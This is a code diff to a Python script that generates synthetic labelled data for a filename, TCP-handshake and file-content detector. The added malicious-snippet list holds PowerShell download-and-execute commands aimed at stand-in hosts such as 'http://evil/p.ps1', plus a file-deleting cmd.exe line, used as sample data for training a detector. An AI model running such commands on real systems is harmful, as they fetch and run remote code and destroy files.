@@ -28,6 +28,7 @@ import random
 from typing import Dict, List, Tuple
 
 ARCHIVE_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'archive')
+OLD_DATASET = os.path.join(os.path.dirname(os.path.dirname(__file__)), '.old-dataset')
 OUT_TRICKS = os.path.join(ARCHIVE_DIR, 'tcp_tricks.jsonl')
 OUT_CSV = os.path.join(ARCHIVE_DIR, 'combined_with_tcp.csv')
 
@@ -47,6 +48,23 @@ INVALID_SEQS = [
     ["ACK", "SYN", "SYN-ACK"],
 ]
 
+# Synthetic content snippets to pair with filenames for content DFA
+MALICIOUS_CONTENT_SNIPPETS = [
+    "powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')",
+    "cmd.exe /c del C:\\Users\\Public\\*.txt",
+    "IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')",
+    "Invoke-WebRequest http://bad.site | IEX",
+    "TVqQAAMAAAAEAAAA base64 payload header",
+]
+
+BENIGN_CONTENT_SNIPPETS = [
+    "Readme: This is a harmless text file.",
+    "User guide: usage instructions and notes.",
+    "Changelog: fixed bugs and improved docs.",
+    "Configuration: key=value pairs; no executable content.",
+    "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
+]
+
 
 def choose_sequence(is_malicious: bool) -> Tuple[List[str], bool, str, str]:
     if is_malicious:
@@ -55,6 +73,13 @@ def choose_sequence(is_malicious: bool) -> Tuple[List[str], bool, str, str]:
     else:
         seq = random.choice(VALID_SEQS)
         return seq, True, "Synthetic valid handshake for benign filename", "Derived Benign"
+
+
+def choose_content(is_malicious: bool) -> str:
+    """Return a synthetic content snippet for content-DFA scanning."""
+    if is_malicious:
+        return random.choice(MALICIOUS_CONTENT_SNIPPETS)
+    return random.choice(BENIGN_CONTENT_SNIPPETS)
 
 
 def read_jsonl_filenames(path: str) -> List[Tuple[str, bool]]:
@@ -129,9 +154,9 @@ def read_csv_filenames(path: str, default_malicious: bool = False) -> List[Tuple
 
 def main():
     os.makedirs(ARCHIVE_DIR, exist_ok=True)
-    jsonl_path = os.path.join(ARCHIVE_DIR, 'Malicious_file_trick_detection.jsonl')
-    comb_path = os.path.join(ARCHIVE_DIR, 'combined_random.csv')
-    malw_path = os.path.join(ARCHIVE_DIR, 'malware.csv')
+    jsonl_path = os.path.join(OLD_DATASET, 'Malicious_file_trick_detection.jsonl')
+    comb_path = os.path.join(OLD_DATASET, 'combined_random.csv')
+    malw_path = os.path.join(OLD_DATASET, 'malware.csv')
 
     # 1) Build TCP traces for the tricks JSONL dataset (write JSONL)
     tricks = read_jsonl_filenames(jsonl_path)
@@ -139,12 +164,14 @@ def main():
     with open(OUT_TRICKS, 'w', encoding='utf-8') as out:
         for filename, is_mal in tricks:
             seq, valid, desc, cat = choose_sequence(is_mal or True)
+            content = choose_content(is_mal or True)
             rec = {
                 "trace_id": filename,
                 "sequence": seq,
                 "valid": valid,
                 "description": desc,
                 "category": cat,
+                "content": content,
             }
             out.write(json.dumps(rec) + "\n")
             written_tricks += 1
@@ -196,11 +223,13 @@ def main():
     # sequence is pipe-delimited tokens to avoid commas
     with open(OUT_CSV, 'w', encoding='utf-8', newline='') as f:
         writer = csv.writer(f)
-        writer.writerow(["trace_id","sequence","valid","description","category"])
+        # Include synthetic content column for downstream DFA-on-contents
+        writer.writerow(["trace_id","sequence","valid","description","category","content"])
         for filename, is_mal in dedup_csv:
             seq, valid, desc, cat = choose_sequence(is_mal)
             seq_str = "|".join(seq)
-            writer.writerow([filename, seq_str, "true" if valid else "false", desc, cat])
+            content = choose_content(is_mal)
+            writer.writerow([filename, seq_str, "true" if valid else "false", desc, cat, content])
             written_csv += 1
 
     print(f"Wrote {written_tricks} TCP trick traces to {OUT_TRICKS}")
